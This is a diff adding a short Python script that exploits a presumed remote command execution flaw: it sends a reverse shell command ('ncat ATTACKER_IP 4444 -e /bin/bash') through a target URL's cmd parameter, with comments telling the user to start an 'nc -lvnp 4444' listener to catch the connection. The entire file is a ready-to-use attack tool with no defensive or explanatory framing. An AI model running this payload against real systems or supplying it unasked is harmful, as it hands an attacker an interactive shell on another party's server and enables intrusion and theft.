@@ -1,0 +1,17 @@
+import requests
+
+# If remote code execution is possible
+
+# Must set up listening on port of choice
+# nc -lvnp 4444
+# Will begin listening, if it works then connection will be received from target
+
+# Target URL
+TARGET_URL = "http://target.com/execute.php?cmd="
+
+# Reverse shell payload (Change ATTACKER_IP)
+payload = "ncat ATTACKER_IP 4444 -e /bin/bash"
+
+print("[+] Sending reverse shell payload...")
+
+requests.get(TARGET_URL + payload)
